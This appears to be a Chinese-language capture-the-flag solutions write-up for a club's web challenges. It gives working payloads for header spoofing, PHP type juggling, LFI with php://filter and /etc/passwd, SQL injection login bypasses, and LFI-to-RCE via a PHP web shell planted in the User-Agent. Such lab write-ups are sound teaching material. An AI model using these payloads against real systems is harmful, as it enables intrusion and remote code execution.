Solutions
===

# Web1

### Forge HTTP 1
只是要練習 curl 的使用方式和 HTTP 的請求方式而已。
當你使用 `curl https://chal.ctf.itac.club/forge1/index.php` 時，server 會回傳 `錯誤的 HTTP 請求方式 :D`。

HTTP 的請求方式已知有八種，全部都試一遍就好了
```
$ curl -X POST https://chal.ctf.itac.club/forge1/index.php

ITAC{HTTP_REQUEST_CAN_BE_FORGED}
```

**Flag: ITAC{HTTP_REQUEST_CAN_BE_FORGED}**

### Forge HTTP 2
練習更進階的 curl 使用方式。
當你請求過去時 server 會回傳 `secret query not set`，我後來發現很多人是英文問題 :sweat_smile:

跟著 server 的指示一步一步做就會拿到 flag 了
```
$ curl -d "user=admin&pass=P4ssw0rd" "https://chal.ctf.itac.club/forge2/?secret=ITACSECRET"

ITAC{Forging_HTTP_Request_is_boring_:/}
```

**Flag: ITAC{Forging_HTTP_Request_is_boring_:/}**

### Admin Panel
看一下 source code 就可以知道一開始就會從 `HTTP_X_FORWARDED_FOR` 抓資料當作 IP，而在 PHP 裡面會對 header 加上 `HTTP_` 前綴，所以實際上的 header 是 `X_Forwarded_For`，所以只要簡單加個 HTTP header 就可以了。

```
$ curl -d "user=admin&pass=admin" -H "X-Forwarded-For: 127.0.0.1" https://chal.ctf.itac.club/admin/index.php

<!DOCTYPE html>
<html>
...

                    <div class="header">ITAC{Wrong_IP_Detection_may_leads_to_security_issue}</div>
...
</html>
```

**Flag: ITAC{Wrong_IP_Detection_may_leads_to_security_issue}**

### Admin Panel - Advanced
題目中有提示到網站使用了 CloudFlare CDN，配合前一題就可以知道要想辦法繞過 IP 檢測的機制，那 google `cloudflare cdn real client ip` 就可以找到線索ㄌ。為了減低難度，我直接在 Hint 放了連結。

那我們就可以從 Docs 中知道有兩個主要的 Header，`CF-Connecting-IP 和 True-Client-IP`。那你兩個都試試看就可以拿到 flag 了
```
$ curl -d "user=admin&pass=admin" -H "True-Client-IP: 127.0.0.1" 'https://cdn.itac.club/'
<!DOCTYPE html>
<html>
...
<div class="header">ITAC{1_d0n7_th1nk_4ny1_c4n_s0lv3_th1s_lol}</div>
...
</html>
```

**Flag: ITAC{1_d0n7_th1nk_4ny1_c4n_s0lv3_th1s_lol}**



# Web2
### Information Leak
根據上課的內容，可以嘗試 `robots.txt` 裡面共有兩個路徑 `/flag.txt` 和 `/s3cr3t/`，那你試一下 `/flag.txt` 就可以拿到 flag 了。

**Flag: ITAC{e4sy_inf0_l34k}**

### Basic PHP
一進去就可以看到 source code，以下來講解一下 source code。
```php
<?php

highlight_file(__FILE__);
// 不用管


require_once("flag.php");
// 匯入 flag

if (isset($_GET['input']) && !empty($_GET['input']) && isset($_GET['hi']) && !empty($_GET['hi'])) {
    // 確認 input 和 hi 參數不是空的
    if ($_GET['input'] === "M4g1c_PHP") {
        // 確認 input 為 M4g1c_PHP
        if (is_array($_GET['hi']) && count($_GET['hi']) >= 5) {
            // hi 參數需要是一個長度是5的 array
            die($flag);
            // 給你 flag
        } else {
            // 錯了
            die("hi 參數錯惹");
        }
    } else {
        // 錯了
        die("input 參數錯惹");
    }
}
```
那就可以使用 `curl` 等相關工具構造 HTTP 請求
```
$ curl "https://chal.ctf.itac.club/basicphp/?input=M4g1c_PHP&hi[]=1&hi[]=1&hi[]=1&hi[]=1&hi[]=1"
...
ITAC{Y0u_kn0w_h0w_b4s1c_php_w0rks}
```

**Flag: ITAC{Y0u_kn0w_h0w_b4s1c_php_w0rks}**

### Info Leak
根據課程內容，可以測試 `/.git` 是否存在。
那你在測試時會發現 `/.git/` 是回覆 403，這是因為目前 `nginx` 和 `apache2` 都預設將 .* 的檔案設定禁止存取，如果你是有經驗的 CTF 玩家，你會知道可以測試 `/.git/HEAD` 或是 `/.git/config` 看是否存在。如果你不知道的話，看到 403 其實就可以直接用工具試試看了。

那我這邊是使用 `githacker`，那一載回來就可以看到有這些檔案
![githacker_scnshot](https://github.com/racterub/itac-ctf/blob/master/assets/img/githacker.png)

那你可以觀察到有兩個檔案特別奇怪 `admin.php` 和 `flag.php`，可以發現 `flag.php` 裡面什麼都沒有，`admin.php` 裡面則有一組帳號密碼。
那再回到網站的 `/s3cr3t/` 登入就可以拿到 flag 了

**Flag: ITAC{git_l3ak_c4n_g3t_s0urc3_code}**

### Make PHP Great Again
這題其實只是考你的程式能力而已 :poop: ，一樣來解釋一下 source code
```php
<?php

require_once("flag.php");

highlight_file(__FILE__);
// 上面的都可以不用理

$target = "QNKCDZO";
// 已知 md5($target) 過後會呈現科學記號格式

if (isset($_GET['input']) && !empty($_GET['input']) && !is_array($_GET['input'])) {
    // 確認 input 不是空的也不是 array
    if (substr($_GET['input'], 0, 4) == "ITAC") {
        // 確認 input 前四個字是 ITAC
        if (@md5($_GET['input']) == @md5($target)) {
            // 比對 input 和 target 的 md5 結果
            die($flag);
            // 給你 flag
        } else {
            // 錯了
            die("HASH 錯ㄌ");
        }
    } else {
        // 錯了
        die("input 前面要是 ITAC");
    }
}
```

那這邊附上我的作法：
```php
<?php

$target = "QNKCDZO";

for ($i = 0; $i<10000000000000; $i++) {
    echo $i."\n";
    $tmp = "ITAC".$i;
    if (md5($tmp) == md5($target)) {
        echo $tmp;
        echo "\n";
        echo md5($tmp);
        echo "\n";
        exit();
    }
}
```

跑個 10467040 次就找到符合條件的 flag 了

**Flag: ITAC{bui1d_y0ur_0wn_md5_h4sh}**

# Web3

### LFI
一進入頁面，只有一個連結可以點，點下去之後可以觀察到網址後面多了 `?p=p.txt`，通常在這邊看到後面還有加副檔名就可以測試看看是否有 LFI。
首先可以將 `p.txt` 改成 `/etc/passwd`，測試過後發現的確存在 LFI 漏洞，那我們就可以繼續嘗試得到 source code。
將 `p.txt` 更改成 `php://filter/convert.base64-encode/resource=index.php` 即可得到 `index.php` 的原始碼。
```php
<?php
session_start();

include("flag.php"); // This includes our flag1

if (isset($_SERVER['HTTP_USER_AGENT']) && !empty($_SERVER['HTTP_USER_AGENT'])) {
    $_SESSION['UA'] = $_SERVER['HTTP_USER_AGENT'];
}

if (isset($_GET['p']) && !empty($_GET['p'])) {
    @include($_GET['p']);
} else {
    @include("base.php");
}
```
我們可以透過原始碼知道主機存有一個 `flag.php` 的檔案，裡面有我們要的 flag，那就跟前面的作法一樣，只是從 `index.php` 改成 `flag.php`

**Flag: ITAC{b451c_Php_LF1_tR1Ck_:D}**

### Login as Admin
首先，網站一開始就有給你 source code，觀察可以發現 sql 語句是用拼接的，有可能有 SQL injection。
```php
<?php

require_once("flag.php");

if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    exit();
}

$connection = new PDO('mysql:host=db;dbname=login;charset=utf8mb4', 'itac', '174c_v3ry_L0n9_p4ZZW0rd_L0L');

$getFlag = false;

if (isset($_POST['user']) || isset($_POST['pass'])) {
    $sql = "SELECT id FROM users WHERE username='".$_POST['user']."' AND password='".$_POST['pass']."';";
    $query = $connection->query($sql);
    if ($query) {
        $result = $query->fetch();
        if ($result) {
            $getFlag = true;
        } else {
            $warning = "Login Failed";
        }
    } else {
        $warning = "Login Failed";
    }
}
?>
```

### Blog
逛一下網站就可以看到每一篇文章的網址都是 `?id=<integer>` 結尾，那我們可以測試 `?id=3 or 1=1 #` 和 `?id=3 or 1=3 #` 來觀察差別，可以發現我們似乎可以注入 SQL query。

那 SQL injection 其中一個使用方式就是可以透過 union 來取的 DB 內容。
首先我們需要先確定該 SQL query 選取了多少 column。這邊的作法有兩種，1. `?id=-3 union select 1,2,3 #` 或是 `?id=3 order by 3 #` 來測試。
那我們透過第一種方式可以測得選取的 column 為兩個，並且可以知道第一欄和第二欄分別使用在哪個地方

接下來可以直接從 `information_schema.schemata` 抓 DB name。
![dbname](https://github.com/racterub/itac-ctf/blob/master/assets/img/dbname.png)

有了 dbname 就可以抓 table name。
![tablename](https://github.com/racterub/itac-ctf/blob/master/assets/img/tablename.png)

剩下 column name 沒抓。
![columnname](https://github.com/racterub/itac-ctf/blob/master/assets/img/columnname.png)

最後大雜燴幹下去。
![flag!](https://github.com/racterub/itac-ctf/blob/master/assets/img/blogflag.png)


### Login as Admin - Advanced
其實考點很明顯，1. 避免使用空白, 2. 避免使用 `1=1`。
我這邊有放水，原本題目還會檢查是否有 `or`，但是怕太雞掰所以砍掉了。

考點的解法其實很簡單。1. 空白改用 `/**/`, 2. `1=1` 改用 `2=2` 之類的恆等式就好了。
```
Username: '/**/or/**/1<2/**/#
Password: 123
```

**Flag: ITAC{5qL1NJ3C710n_bu7_W17H_4_DUMb422_F1L73r}**

### 🐚
這題其實不認為有人解的出來，只是來釣高手的 XD

首先眼尖的人可以發現這題跟 `LFI` 是同一題，而且 CTFd 提示需要執行程式，所以這題的目標是得到 RCE。
那我們可以先透過 LFI 拿到 source code。
```php
<?php
session_start();

include("flag.php"); // This includes our flag1

if (isset($_SERVER['HTTP_USER_AGENT']) && !empty($_SERVER['HTTP_USER_AGENT'])) {
    $_SESSION['UA'] = $_SERVER['HTTP_USER_AGENT'];
}

if (isset($_GET['p']) && !empty($_GET['p'])) {
    @include($_GET['p']);
} else {
    @include("base.php");
}
```

可以發現我們的 `User-Agent` 被塞到 session 裡面，而 `User-Agent` 為我們可控制的內容，那我們就可以嘗試 include session 的檔案。
在 Ubuntu 系統中 PHP 預設存放 session 檔案的位置為 `/var/lib/php/sessions/sess_{PHPSESSID}` 那我們可以先在 `User-Agent` 構造一個 php shell，並且留意 PHPSESSID。
```
curl -H "User-Agent: <?php system(\$_GET['cmd']);?>" https://lfi.ctf.itac.club/ -v
...
> GET / HTTP/1.1
> Host: lfi.ctf.itac.club
> Accept: */*
> User-Agent: <?php system($_GET['cmd']);?>
>
< HTTP/1.1 200 OK
...
< Set-Cookie: PHPSESSID=uas2q2qum385drandfl31cc5c9; path=/
...
```

直接在參數 `p` 引入 session 檔案並且多加一個參數 `cmd` 來執行 Linux 指令。
![rce](https://github.com/racterub/itac-ctf/blob/master/assets/img/shellrce.png)

那我們就可以執行程式 `/getflag`
![flag](https://github.com/racterub/itac-ctf/blob/master/assets/img/shellflag.png)